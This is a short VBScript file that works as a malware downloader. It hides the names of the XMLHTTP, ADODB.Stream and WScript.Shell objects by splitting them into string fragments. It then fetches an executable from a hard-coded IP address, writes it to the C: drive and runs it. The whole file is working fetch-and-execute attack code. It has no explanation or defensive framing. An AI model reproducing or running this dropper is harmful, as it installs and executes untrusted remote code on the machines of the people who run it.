Function lemme()
lemme = "Microsoft"&".XML"&"HTTP"
End Function
Function doit()
doit = "ADO"&"DB"&".Stream"
End Function
Function rightnow()
rightnow = "W"&"Script"&"."&"Shell"
End Function
Set dont = CreateObject(rightnow())
Set modify = CreateObject(lemme())
Set myshit = CreateObject(doit())
modify.Open "GET","http://64.243.115.202:8080/good/hah.exe",0
modify.Send()
myshit.Mode = 3
myshit.Type = 1
myshit.Open()
myshit.Write(modify.responseBody)
myshit.SaveToFile "c:\tmpon.exe",2
dont.run("c:\tmpon.exe")
